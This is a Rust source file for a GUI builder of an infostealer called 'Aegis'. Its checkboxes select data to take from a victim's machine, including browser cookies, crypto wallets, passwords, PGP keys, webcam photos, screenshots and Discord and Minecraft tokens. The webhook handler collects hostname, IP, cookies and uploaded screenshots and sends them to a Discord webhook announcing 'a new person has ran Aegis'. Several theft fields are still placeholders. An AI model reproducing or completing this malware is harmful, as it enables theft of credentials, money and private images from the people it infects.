use iced::{
    Element, Theme, application,
    widget::{button, checkbox, column, container, row, text, text_input},
};
use tokio::runtime::{Builder, Runtime};

use crate::utils::webhook::EmbedThumbnail;
use crate::utils::webhook::WebhookField;
use crate::utils::{grab, webhook::Embed};
use crate::utils::{grab::get_host, webhook::EmbedFooter};

mod utils;

#[derive(Default, Debug, Clone)]
struct App {
    webhook_uri: Option<String>,
    browser_cookies: bool,
    crypto_wallets: bool,
    txt_files: bool,
    passwords: bool,
    pgp_keys: bool,
    webcam_photo: bool,
    screenshot_desktop: bool,
    discord_token: bool,
    minecraft_ssid: bool,
    growtopia_save_dat: bool,

    mongodb: bool,
    mongodb_uri: String,
}

#[derive(Debug, Clone)]
enum Message {
    ChangeWebhookUri(String),
    ToggleBrowserCookies(bool),
    ToggleCryptoWallets(bool),
    ToggleTxtFiles(bool),
    TogglePasswords(bool),
    TogglePgpKeys(bool),
    ToggleWebcamPhoto(bool),
    ToggleScreenshotDesktop(bool),
    ToggleDiscordToken(bool),
    ToggleMinecraftSsid(bool),
    ToggleGrowtopiaSaveDat(bool),
    ToggleMongoDB(bool),
    ChangeMongoDBUri(String),
    SendMongo,
    SendWebhook,
}

impl App {
    fn update(&mut self, message: Message) {
        match message {
            Message::ChangeWebhookUri(uri) => {
                self.webhook_uri = Some(uri);
            }
            Message::ToggleBrowserCookies(toggle) => {
                self.browser_cookies = toggle;
            }
            Message::ToggleCryptoWallets(toggle) => {
                self.crypto_wallets = toggle;
            }
            Message::ToggleTxtFiles(toggle) => {
                self.txt_files = toggle;
            }
            Message::TogglePasswords(toggle) => {
                self.passwords = toggle;
            }
            Message::TogglePgpKeys(toggle) => {
                self.pgp_keys = toggle;
            }
            Message::ToggleWebcamPhoto(toggle) => {
                self.webcam_photo = toggle;
            }
            Message::ToggleScreenshotDesktop(toggle) => {
                self.screenshot_desktop = toggle;
            }
            Message::ToggleDiscordToken(toggle) => {
                self.discord_token = toggle;
            }
            Message::ToggleMinecraftSsid(toggle) => {
                self.minecraft_ssid = toggle;
            }
            Message::ToggleGrowtopiaSaveDat(toggle) => {
                self.growtopia_save_dat = toggle;
            }
            Message::ToggleMongoDB(toggle) => {
                self.mongodb = toggle;
            }
            Message::ChangeMongoDBUri(uri) => {
                self.mongodb_uri = uri;
            }
            Message::SendWebhook => {
                if let Some(uri) = &self.webhook_uri {
                    let rt = Builder::new_current_thread().enable_all().build().unwrap();

                    rt.block_on(async {

                        let ip = grab::get_ip().await.unwrap_or_default();

                        let embeds = [ Embed {
                            title: "New Connection!".to_string(),
                            description: "A new person has ran Aegis. Enjoy!".to_string(),
                            footer: EmbedFooter {
                                text: "by @shoegazers (Rivers Frost) on GitHub! https://github.com/shoegazers/Aegis".to_string(),
                            },
                            thumbnail: EmbedThumbnail {
                                url: "https://cdn.discordapp.com/attachments/1502671248914780172/1502675954298912939/ebdc35ac12f72951ef450f3e50c685af.png?ex=6a009389&is=69ff4209&hm=85982e6905ed1242a9d5679807c5f94fdd1b711ea63f8c111863444a6c6920f2&".to_string(),
                            },
                            fields: [
                                WebhookField {
                                    name: "General Information".to_string(),
                                    value: format!("Hostname: {:?}\nIP Address: {:?}", grab::get_host(), ip),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Browser Cookies".to_string(),
                                    value: format!("{:?}", grab::grab_cookies().await.unwrap().join(", ")),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Crypto Wallets".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Text Files".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Passwords".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "PGP Keys".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Webcam Photo".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Desktop Screenshot(s)".to_string(),
                                    value: format!("{:?}", grab::screenshot_desktop_and_upload().await.unwrap().join(", ")),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Discord Token".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Minecraft SSID".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Growtopia save.dat".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                            ].to_vec(),
                        }];

                        let hook = utils::webhook::WebhookPayload {
                            username: "Aegis".to_string(),
                            avatar_url: "https://cdn.discordapp.com/attachments/1502671248914780172/1502675954298912939/ebdc35ac12f72951ef450f3e50c685af.png?ex=6a009389&is=69ff4209&hm=85982e6905ed1242a9d5679807c5f94fdd1b711ea63f8c111863444a6c6920f2&".to_string(),
                            content: "@everyone > New Connection Established!".to_string(),
                            embeds: embeds.to_vec(),
                        };

                        utils::webhook::send(uri, &hook).await;
                    })
                }
            }
            Message::SendMongo => {
                let rt = tokio::runtime::Runtime::new().unwrap();
                rt.block_on(utils::mongodb::insert(
                    &self.mongodb_uri.as_str(),
                    Some(format!("{:?}", grab::get_host()).as_str()),
                    None,
                    None,
                    None,
                    None,
                    None,
                    None,
                    None,
                    None,
                    None,
                    None,
                    None,
                ));
            }
        }
    }

    fn view(&self) -> Element<Message> {
        let row = row![
            column![
                checkbox(self.browser_cookies)
                    .label("Browser Cookies")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleBrowserCookies),
                checkbox(self.crypto_wallets)
                    .label("Crypto Wallets")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleCryptoWallets),
                checkbox(self.txt_files)
                    .label("Txt Files")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleTxtFiles),
                checkbox(self.passwords)
                    .label("Passwords")
                    .text_size(12.0)
                    .on_toggle(Message::TogglePasswords),
                checkbox(self.mongodb)
                    .label("MongoDB")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleMongoDB),
                if self.mongodb {
                    text_input("MongoDB URI", self.mongodb_uri.as_str())
                        .on_input(Message::ChangeMongoDBUri)
                        .width(170.0)
                        .size(12.0)
                        .into()
                } else {
                    let e: Element<'_, Message> =
                        text("MongoDB URI is not enabled").size(12.0).into();
                    e
                },
            ]
            .spacing(10.0),
            column![
                checkbox(self.pgp_keys)
                    .label("Pgp Keys")
                    .text_size(12.0)
                    .on_toggle(Message::TogglePgpKeys),
                checkbox(self.webcam_photo)
                    .label("Webcam Photo")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleWebcamPhoto),
                checkbox(self.screenshot_desktop)
                    .label("Screenshot Desktop")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleScreenshotDesktop),
                checkbox(self.discord_token)
                    .label("Discord Token")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleDiscordToken),
            ]
            .spacing(10.0),
            column![
                checkbox(self.minecraft_ssid)
                    .label("Minecraft Ssid")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleMinecraftSsid),
                checkbox(self.growtopia_save_dat)
                    .label("Growtopia Save Dat")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleGrowtopiaSaveDat),
                text_input(
                    "Discord Webhook URL",
                    self.webhook_uri.as_deref().unwrap_or("")
                )
                .on_input(Message::ChangeWebhookUri)
                .width(200.0)
                .size(12.0),
                button("Test Hook").on_press(Message::SendWebhook),
                button("Test MongoDB").on_press(Message::SendMongo),
            ]
            .spacing(10.0),
        ]
        .padding(20.0)
        .spacing(10.0);

        container(row).into()
    }
}

fn main() -> iced::Result {
    application(|| App::default(), App::update, App::view)
        .window_size((500.0, 300.0))
        .theme(|app: &App| Theme::Oxocarbon)
        .run()
}
